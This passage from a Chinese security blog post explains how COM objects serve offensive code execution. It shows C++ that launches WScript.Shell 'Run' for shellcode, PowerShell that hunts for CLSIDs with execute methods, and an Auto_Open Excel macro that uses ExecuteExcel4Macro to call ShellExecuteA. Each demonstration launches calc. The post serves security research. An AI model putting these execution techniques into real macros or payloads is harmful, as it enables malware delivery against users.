    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">clsidshell</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">IID_IDispatch</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">lpDisp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="n">LPOLESTR</span> <span class="n">pFuncName</span> <span class="o">=</span> <span class="s">L"Run"</span><span class="p">;</span>
    <span class="n">DISPID</span> <span class="n">Run</span><span class="p">;</span>
    <span class="n">hres</span> <span class="o">=</span> <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">GetIDsOfNames</span><span class="p">(</span><span class="n">IID_NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pFuncName</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">LOCALE_SYSTEM_DEFAULT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Run</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="c1">// Step 4: ---------------------------------------</span>
    <span class="c1">// 填写COM组件参数并执行方法 -----------------------</span>
    <span class="n">VARIANTARG</span> <span class="n">V</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">V</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">vt</span> <span class="o">=</span> <span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">bstrVal</span> <span class="o">=</span> <span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"cmd /c calc.exe"</span><span class="p">);</span>
    <span class="n">DISPPARAMS</span> <span class="n">disParams</span> <span class="o">=</span> <span class="p">{</span> <span class="n">V</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">hres</span> <span class="o">=</span> <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">Invoke</span><span class="p">(</span><span class="n">Run</span><span class="p">,</span> <span class="n">IID_NULL</span><span class="p">,</span> <span class="n">LOCALE_SYSTEM_DEFAULT</span><span class="p">,</span> <span class="n">DISPATCH_METHOD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">disParams</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="c1">// Clean up</span>
    <span class="c1">//--------------------------</span>
    <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
    <span class="n">CoUninitialize</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>步骤一、二都是用来初始化调用COM对象，步骤三使用了CoCreateInstance创建了WScript.Shell对象的IDispatch类接口，使用GetIDsOfNames函数获得了Run函数的ID。步骤四通过函数ID使用Invoke函数执行了Run方法起calc，最终运行的效果和IE的EXP一致，这里就不再展示了。</p>

<p>那么，如此复杂的方式相比VBS有什么好处呢？那就是可以将C++代码通过shellcode生成框架转化为shellcode，生成后的shellcode比VBS能用在更多的地方，更加灵活，至于如何将代码转换成shellcode本文就不再讲述了。</p>

<h2 id="通过powershell创建com对象">通过powershell创建COM对象</h2>

<p>接下来就是最后一种创建COM对象的方式：使用powershell创建COM对象。使用powershell一样可以分别通过ProgID和CLSID创建，使用<code class="language-plaintext highlighter-rouge">$shell = [Activator]::CreateInstance([type]::GetTypeFromProgID("WScript.Shell"))</code>命令可通过ProgID创建WSH对象，而使用<code class="language-plaintext highlighter-rouge">$shell = [Activator]::CreateInstance([type]::GetTypeFromCLSID("72C24DD5-D70A-438B-8A42-98424B88AFB8"))</code>则可以通过CLSID创建，下图是通过CLSID创建后的效果：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/powershell创建COM.png" alt="powershell创建COM" /></p>

<p>通过这种创建COM对象的方式，我们便可以编写powershell脚本进行COM对象的遍历了，获取计算机中大部分COM对象的方法和属性了。</p>

<h1 id="com对象的挖掘">COM对象的挖掘</h1>

<p>这部分的内容参考了FIREEYE的研究进行，利用powershell脚本遍历COM对象的方式成功挖掘到一种利用方式，故此分享。</p>

<h2 id="已公开com对象利用挖掘">已公开COM对象利用挖掘</h2>

<p>首先需要遍历系统中所有COM对象的CLSID，于是编写powershell脚本，将CLSID输出到txt文本中：</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">New-PSDrive</span><span class="w"> </span><span class="nt">-PSProvider</span><span class="w"> </span><span class="nx">registry</span><span class="w"> </span><span class="nt">-Root</span><span class="w"> </span><span class="nx">HKEY_CLASSES_ROOT</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">HKCR</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">HKCR:\CLSID</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Skip</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">clsids.txt</span><span class="w">
</span></code></pre></div></div>

<p>生成的clsid.txt如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid.png" alt="clsid" /></p>

<p>接着利用这些clsid通过powershell创建对应的COM对象，并且使用Get-Member方法获取对应的方法和属性，并最终输出到文本中，pwoershell脚本如下：</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Position</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="nv">$Filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"clsid-members.txt"</span><span class="w">
</span><span class="bp">$input</span><span class="n">Filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"clsids.txt"</span><span class="w">
</span><span class="kr">ForEach</span><span class="p">(</span><span class="nv">$CLSID</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="bp">$input</span><span class="nx">Filename</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="nv">$Position</span><span class="si">)</span><span class="s2"> - </span><span class="si">$(</span><span class="nv">$CLSID</span><span class="si">)</span><span class="s2">"</span><span class="w">
      </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"------------------------"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
      </span><span class="n">Write-Output</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="nv">$CLSID</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
      </span><span class="nv">$handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">activator</span><span class="p">]::</span><span class="n">CreateInstance</span><span class="p">([</span><span class="n">type</span><span class="p">]::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="nv">$CLSID</span><span class="p">))</span><span class="w">
      </span><span class="nv">$handle</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
      </span><span class="nv">$Position</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>脚本运行期间可能会打开各种软件，甚至会退出，需要截取clsid重新运行。运行后的文本内容为：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid-members.png" alt="clsid-members" /></p>

<p>通过搜索关键词：execute、exec、和run，能够发现不少可以利用的COM对象。本人由于在研究宏相关的COM利用，于是尝试了关键字ExecuteExcel4Macro，结果意外的收获到了COM对象Microsoft.Office.Interop.Excel.GlobalClass：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro.png" alt="ExecuteExcel4Macro" /></p>

<p>于是使用ExecuteExcel4Macro函数加载shell32.dll中的ShellExecuteA成功起calc：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub Auto_Open()
Set execl = GetObject("new:00020812-0000-0000-C000-000000000046")
execl.ExecuteExcel4Macro ("CALL(""shell32"", ""ShellExecuteA"", ""JJJCJJH"", -1, 0, ""CALC"", 0, 0, 5)")
End Sub
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro-calc.png" alt="ExecuteExcel4Macro-calc" /></p>

<h2 id="未公开com对象利用挖掘">未公开COM对象利用挖掘</h2>

<p>对于已经公开的COM对象挖掘较为容易，当面对未公开的COM对象时，就需要通过逆向挖掘利用。比如位于<code class="language-plaintext highlighter-rouge">C:\windows\system32\wat\watweb.dll</code>中的WatWeb.WatWebObject对象公开了一个名为LaunchSystemApplication的方法，在oleview中能看到需要3个参数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/oleview.png" alt="oleview" /></p>

<p>但仅凭这些信息无法确定该方法是否能起任意进程，于是逆向查看LaunchSystemApplication，由于有调试符号，因此可以直接定位到该方法：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplication.png" alt="LaunchSystemApplication" /></p>

<p>LaunchSystemApplication调用LaunchSystemApplicationInternal，进入查看发现调用了CreateProcess，有利用的可能：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplicationInternal.png" alt="LaunchSystemApplicationInternal" /></p>

<p>但是可以看到调用了IsApprovedApplication方法进行校验，进入查看：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/IsApprovedApplication.png" alt="IsApprovedApplication" /></p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExeName.png" alt="ExeName" /></p>

<p>发现需要校验传入的字符串为slui.exe，同时会将该字符串附加到系统路径下，因此并不能随意执行进程。尽管最终没有利用成功，但是这种思路可以帮助分析其他未知的COM对象，挖掘到更多的利用方式。</p>

<h1 id="结论">结论</h1>

<p>COM对象功能强大，灵活便捷，可以用于浏览器、脚本、Office宏、shellcode和powershell。通过powershell遍历系统中的COM对象，结合逆向分析更有可能发现未公开的利用方式。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">FireEye-Hunting COM Objects</a></p>

<p>[2] <a href="https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html">Github-Brian Pak-CVE-2016-0189-exploit</a></p>

<p>[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown">Microsoft-IUnknown接口说明文档</a></p>

<p>[4] <a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory">Microsoft-IClassFactory接口说明文档</a></p>

<p>[5] <a href="https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch">Microsoft-IDispatch接口说明文档</a></p>

<p>[6] <a href="https://blog.csdn.net/weiwangchao_/article/details/6949264">CSDN-COM三大接口:IUnknown、IClassFactory、IDispatch</a></p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 本文在FireEye的研究Hunting COM Objects[1]的基础上，讲述COM对象在IE漏洞、shellcode和Office宏中的利用方式以及如何挖掘可利用的COM对象，获取新的漏洞利用方式。]]></summary></entry></feed>